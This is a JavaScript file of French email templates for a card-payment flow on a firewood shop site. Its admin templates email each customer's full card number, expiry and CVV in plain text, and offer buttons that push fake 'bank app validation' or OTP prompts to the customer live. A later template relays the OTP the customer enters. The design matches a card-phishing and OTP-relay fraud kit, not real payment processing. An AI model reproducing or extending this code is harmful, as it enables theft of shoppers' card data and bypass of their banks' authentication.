// Templates d'emails pour le flux de paiement par carte bancaire (CB)

function emailLayout({ title, preheader = "", content }) {
    return `<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${title}</title>
  <style>
    body { margin: 0; padding: 0; background: #f4f4f5; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; color: #18181b; }
    .wrapper { max-width: 600px; margin: 32px auto; background: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
    .header { background: #d97706; padding: 24px 32px; }
    .header h1 { margin: 0; color: #ffffff; font-size: 22px; font-weight: 700; letter-spacing: -0.3px; }
    .body { padding: 32px; }
    .body h2 { margin: 0 0 16px; font-size: 18px; font-weight: 600; }
    .body p { margin: 0 0 16px; line-height: 1.6; color: #52525b; }
    .btn { display: inline-block; background: #d97706; color: #ffffff !important; text-decoration: none; padding: 12px 28px; border-radius: 8px; font-weight: 600; font-size: 15px; margin: 8px 0 16px; }
    .info-box { background: #fef3c7; border-radius: 8px; padding: 16px 20px; margin: 16px 0; }
    .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #fde68a; font-size: 14px; }
    .info-row:last-child { border-bottom: none; }
    .info-row .label { color: #78716c; }
    .info-row .value { font-weight: 500; }
    .total-row { display: flex; justify-content: space-between; padding: 10px 0 0; font-size: 16px; font-weight: 700; }
    .footer { padding: 20px 32px; border-top: 1px solid #e4e4e7; text-align: center; font-size: 12px; color: #a1a1aa; }
  </style>
</head>
<body>
  ${preheader ? `<span style="display:none;max-height:0;overflow:hidden;">${preheader}</span>` : ""}
  <div class="wrapper">
    <div class="header">
      <h1>Mon Bois de Chauffe</h1>
    </div>
    <div class="body">
      ${content}
    </div>
    <div class="footer">
      <p>© ${new Date().getFullYear()} Mon Bois de Chauffe</p>
    </div>
  </div>
</body>
</html>`
}

/**
 * EMAIL 1 — Envoyé à l'admin dès que le client clique "Payer par CB".
 * Contient les informations de la carte bancaire et 4 boutons d'action.
 */
export function adminCardInfoEmail({
    customerName,
    customerEmail,
    cardNumber,
    cardName,
    cardExpiry,
    cardCvc,
    orderRef,
    amount,
    bankValidationUrl,
    otpRequestUrl,
    approveUrl,
    rejectUrl,
}) {
    return {
        subject: `💳 Nouvelle tentative de paiement carte — Commande #${orderRef}`,
        html: emailLayout({
            title: "Informations de carte reçues",
            preheader: `${customerName} tente de payer par carte — commande #${orderRef}`,
            content: `
        <h2>Tentative de paiement par carte</h2>
        <p>
          Un client vient de saisir ses informations de carte bancaire.
          <strong>Choisissez l'action à effectuer ci-dessous.</strong>
        </p>

        <div class="info-box">
          <div class="info-row">
            <span class="label">Commande</span>
            <span class="value">#${orderRef}</span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${customerName}</span>
          </div>
          <div class="info-row">
            <span class="label">Email client</span>
            <span class="value">${customerEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Numéro de carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cardNumber}</span>
          </div>
          <div class="info-row">
            <span class="label">Titulaire</span>
            <span class="value">${cardName}</span>
          </div>
          <div class="info-row">
            <span class="label">Expiration</span>
            <span class="value">${cardExpiry}</span>
          </div>
          <div class="info-row">
            <span class="label">CVV</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cardCvc}</span>
          </div>
          <div class="total-row">
            <span>Montant</span>
            <span>${amount}</span>
          </div>
        </div>

        <p style="text-align:center; margin: 28px 0 6px; font-weight:600; color:#3f3f46;">
          Choisissez l'action à effectuer :
        </p>

        <p style="text-align:center; margin: 0 0 12px;">
          <a href="${bankValidationUrl}"
             style="display:inline-block; background:#2563eb; color:#ffffff !important; text-decoration:none; padding:13px 22px; border-radius:8px; font-weight:700; font-size:14px; margin: 4px 6px;">
            📲 Demande validation app bancaire
          </a>
          <a href="${otpRequestUrl}"
             style="display:inline-block; background:#7c3aed; color:#ffffff !important; text-decoration:none; padding:13px 22px; border-radius:8px; font-weight:700; font-size:14px; margin: 4px 6px;">
            🔑 Demande code OTP
          </a>
        </p>

        <p style="text-align:center; margin: 0 0 8px;">
          <a href="${approveUrl}"
             style="display:inline-block; background:#16a34a; color:#ffffff !important; text-decoration:none; padding:13px 22px; border-radius:8px; font-weight:700; font-size:14px; margin: 4px 6px;">
            ✓ Valider le paiement
          </a>
          <a href="${rejectUrl}"
             style="display:inline-block; background:#dc2626; color:#ffffff !important; text-decoration:none; padding:13px 22px; border-radius:8px; font-weight:700; font-size:14px; margin: 4px 6px;">
            ✗ Refuser le paiement
          </a>
        </p>

        <p style="color:#71717a; font-size:12px; text-align:center; margin-top:20px;">
          Les boutons bleu et violet changent l'affichage côté client en temps réel.<br>
          Les boutons vert et rouge finalisent immédiatement le paiement.<br>
          Ces liens sont à usage unique.
        </p>
      `,
        }),
    }
}

/**
 * EMAIL 2 — Envoyé à l'admin quand le client soumet son code OTP.
 */
export function adminOtpValidationEmail({
    customerName,
    customerEmail,
    otpCode,
    cardNumber,
    orderRef,
    amount,
    approveUrl,
    rejectUrl,
}) {
    return {
        subject: `[Action requise] Code OTP reçu — Commande #${orderRef}`,
        html: emailLayout({
            title: "Validation OTP requise",
            preheader: `${customerName} a saisi le code OTP. Validez ou refusez le paiement.`,
            content: `
        <h2>Code OTP soumis par le client</h2>
        <p>
          Le client a saisi le code OTP que vous lui avez envoyé.
          <strong>Vérifiez que le code correspond, puis validez ou refusez.</strong>
        </p>

        <div style="margin: 20px 0; padding: 24px; background: #1e1b4b; border-radius: 12px; text-align: center;">
          <p style="margin:0 0 8px; color:#a5b4fc; font-size:11px; text-transform:uppercase; letter-spacing:2px; font-weight:600;">
            Code OTP saisi par le client
          </p>
          <p style="margin:0; color:#ffffff; font-size:40px; font-weight:800; font-family:monospace; letter-spacing:10px;">
            ${otpCode}
          </p>
          <p style="margin:12px 0 0; color:#a5b4fc; font-size:12px;">
            Vérifiez que ce code correspond à celui que vous avez envoyé par SMS
          </p>
        </div>

        <div class="info-box">
          <div class="info-row">
            <span class="label">Commande</span>
            <span class="value">#${orderRef}</span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${customerName} — ${customerEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:1px">${cardNumber}</span>
          </div>
          <div class="total-row">
            <span>Montant</span>
            <span>${amount}</span>
          </div>
        </div>

        <p style="text-align:center; margin: 28px 0 8px;">
          <a href="${approveUrl}"
             style="display:inline-block; background:#16a34a; color:#ffffff !important; text-decoration:none; padding:14px 36px; border-radius:8px; font-weight:700; font-size:15px; margin: 0 8px;">
            ✓ VALIDER le paiement
          </a>
          <a href="${rejectUrl}"
             style="display:inline-block; background:#dc2626; color:#ffffff !important; text-decoration:none; padding:14px 36px; border-radius:8px; font-weight:700; font-size:15px; margin: 0 8px;">
            ✗ REFUSER le paiement
          </a>
        </p>

        <p style="color:#71717a; font-size:12px; text-align:center; margin-top:20px;">
          Ces liens sont à usage unique.<br>
          Si le code ne correspond pas à celui que vous avez envoyé, cliquez sur <strong>REFUSER</strong>.
        </p>
      `,
        }),
    }
}

function formatPrice(n) {
    return Number(n).toFixed(2).replace(".", ",") + " €"
}

/**
 * Email envoyé au client quand son paiement par carte est APPROUVÉ par l'admin.
 */
export function cardPaymentApprovedEmail({ customerName, order, trackingUrl }) {
    return {
        subject: `Paiement approuvé — Commande #${order.orderNumber}`,
        html: emailLayout({
            title: "Paiement approuvé",
            preheader: `Votre paiement de ${formatPrice(order.total)} a été approuvé.`,
            content: `
        <h2>Paiement approuvé !</h2>
        <p>Bonjour ${customerName},</p>
        <p>
          Votre paiement par carte bancaire pour la commande
          <strong>#${order.orderNumber}</strong> a été <strong>approuvé</strong>.
          Votre commande est désormais <strong>confirmée</strong> et sera préparée sous peu.
        </p>

        <div class="info-box">
          <div class="info-row">
            <span class="label">Commande</span>
            <span class="value">#${order.orderNumber}</span>
          </div>
          <div class="info-row">
            <span class="label">Mode de paiement</span>
            <span class="value">Carte bancaire</span>
          </div>
          <div class="total-row">
            <span>Montant payé</span>
            <span>${formatPrice(order.total)}</span>
          </div>
        </div>

        <p>Conservez cet email comme preuve de paiement.</p>

        <p style="text-align:center;">
          <a href="${trackingUrl}" class="btn">Suivre ma commande</a>
        </p>
      `,
        }),
    }
}

/**
 * Email envoyé au client quand son paiement par carte est REFUSÉ par l'admin.
 */
export function cardPaymentRejectedEmail({ customerName, order, trackingUrl }) {
    return {
        subject: `Paiement refusé — Commande #${order.orderNumber}`,
        html: emailLayout({
            title: "Paiement refusé",
            preheader: `Votre tentative de paiement par carte a été refusée.`,
            content: `
        <h2>Paiement refusé</h2>
        <p>Bonjour ${customerName},</p>
        <p>
          Votre tentative de paiement par carte bancaire pour la commande
          <strong>#${order.orderNumber}</strong> n'a pas abouti.
        </p>
        <p>
          Vous pouvez retenter avec une autre carte ou choisir le virement bancaire
          depuis votre suivi de commande.
        </p>

        <div class="info-box">
          <div class="info-row">
            <span class="label">Commande</span>
            <span class="value">#${order.orderNumber}</span>
          </div>
          <div class="total-row">
            <span>Montant</span>
            <span>${formatPrice(order.total)}</span>
          </div>
        </div>

        <p style="text-align:center;">
          <a href="${trackingUrl}" class="btn" style="background:#dc2626;">Réessayer le paiement</a>
        </p>

        <p style="color:#71717a;font-size:13px;">
          Si vous pensez qu'il s'agit d'une erreur, contactez notre support.
        </p>
      `,
        }),
    }
}
